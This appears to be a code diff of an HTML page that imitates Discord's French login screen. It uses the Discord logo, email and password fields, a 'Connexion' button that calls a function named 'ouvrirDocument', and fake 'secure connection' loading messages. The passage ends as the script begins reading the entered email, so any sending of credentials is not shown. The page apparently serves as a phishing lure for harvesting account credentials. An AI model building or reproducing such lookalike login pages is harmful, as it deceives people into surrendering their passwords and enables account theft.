@@ -7,28 +7,6 @@
     
 </head>
 <body>
-
-<div class="container">
-    <div class="left">
-        <img class="logo" src="https://seeklogo.com/images/D/discord-logo-134E148657-seeklogo.com.png" alt="Discord Logo">
-        <h1>Bienvenue à nouveau !</h1>
-        <p>Nous sommes si heureux de vous revoir !</p>
-
-        <label for="email">ADRESSE E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
-        <input type="text" id="email" placeholder="Entrez votre e-mail" required>
-
-        <label for="password">MOT DE PASSE</label>
-        <input type="password" id="password" placeholder="Entrez votre mot de passe" required>
-
-        <button type="button" onclick="ouvrirDocument()">Connexion</button>
-
-        <div class="loading" id="loading">
-            <p>🔐 Vérification de vos informations...</p>
-            <p>📡 Connexion sécurisée en cours...</p>
-        </div>
-    </div>
-    <div class="right"></div>
-</div>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Google Sans',Roboto,Arial,sans-serif; }
   body { background:#f0f4f9; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; }
@@ -56,6 +34,27 @@
   .footer a { color:#5f6368; text-decoration:none; }
   .clearfix::after { content:""; display:table; clear:both; }
 </style>
+<div class="container">
+    <div class="left">
+        <img class="logo" src="https://seeklogo.com/images/D/discord-logo-134E148657-seeklogo.com.png" alt="Discord Logo">
+        <h1>Bienvenue à nouveau !</h1>
+        <p>Nous sommes si heureux de vous revoir !</p>
+
+        <label for="email">ADRESSE E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
+        <input type="text" id="email" placeholder="Entrez votre e-mail" required>
+
+        <label for="password">MOT DE PASSE</label>
+        <input type="password" id="password" placeholder="Entrez votre mot de passe" required>
+
+        <button type="button" onclick="ouvrirDocument()">Connexion</button>
+
+        <div class="loading" id="loading">
+            <p>🔐 Vérification de vos informations...</p>
+            <p>📡 Connexion sécurisée en cours...</p>
+        </div>
+    </div>
+    <div class="right"></div>
+</div>
 <script>
     function ouvrirDocument() {
         var email = document.getElementById('email').value.trim();
